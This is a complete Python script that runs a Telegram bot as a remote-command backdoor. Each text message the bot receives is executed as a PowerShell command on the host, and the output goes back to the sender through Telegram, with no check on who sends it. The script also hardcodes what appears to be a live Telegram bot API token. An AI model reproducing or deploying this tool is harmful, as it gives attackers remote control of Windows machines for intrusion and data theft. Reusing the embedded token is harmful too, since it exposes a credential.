#!/usr/bin/python
# coding:utf-8

import subprocess
import telepot
import time


bot = telepot.Bot('755465972:AAFgdyPCcP3wFSjXJ-FfGMXzPTmwxvVcey0')


def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    #print(content_type, chat_type, chat_id)

    if content_type == 'text':
        msg = (msg['text'])
        p = subprocess.Popen(["powershell.exe",msg], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        pstdout = p.stdout.read()
        pstderr = p.stderr.read()
        result = pstdout + pstderr
        print(result)
        chat_id = str(chat_id)
        result = result.decode('ascii', errors='replace')
        bot.sendMessage(chat_id, result)

bot.message_loop(handle)

print ('Listening ...')

while 1:
    time.sleep(1)